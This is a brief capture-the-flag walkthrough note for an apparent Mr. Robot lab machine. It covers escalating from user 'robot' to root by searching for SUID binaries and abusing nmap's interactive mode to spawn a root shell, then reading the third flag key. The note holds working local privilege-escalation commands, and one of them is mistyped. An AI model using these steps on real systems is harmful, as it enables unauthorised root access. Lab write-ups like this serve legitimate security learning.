after login using user : robot 
we need to escalate to root
to do that google privilage escalation linux
open payatu.com link
see third point EXPLOITING SUID EXECUTABLES
type find / -perm -u=s -type f 2>/dev/null 
we find that nmap have suid bit set
type nmap --interactives
!sh

cd root
ls
we got our third key
key=04787ddef27c3dee1ee161b21670b4e4

